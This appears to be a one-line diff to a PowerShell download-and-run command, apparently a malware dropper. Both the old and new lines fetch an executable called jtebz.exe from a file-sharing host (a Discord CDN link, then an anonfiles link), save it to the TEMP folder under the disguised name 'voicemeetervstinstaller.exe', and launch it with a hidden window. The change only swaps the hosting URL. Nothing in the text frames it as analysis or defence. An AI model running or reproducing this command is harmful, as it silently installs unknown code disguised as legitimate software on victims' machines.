@@ -1,1 +1,1 @@
-iwr -useb https://cdn.discordapp.com/attachments/1060570659043934318/1060658269552652388/jtebz.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://cdn-123.anonfiles.com/N5S1naQ2y0/6ff9ef52-1672952246/jtebz.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
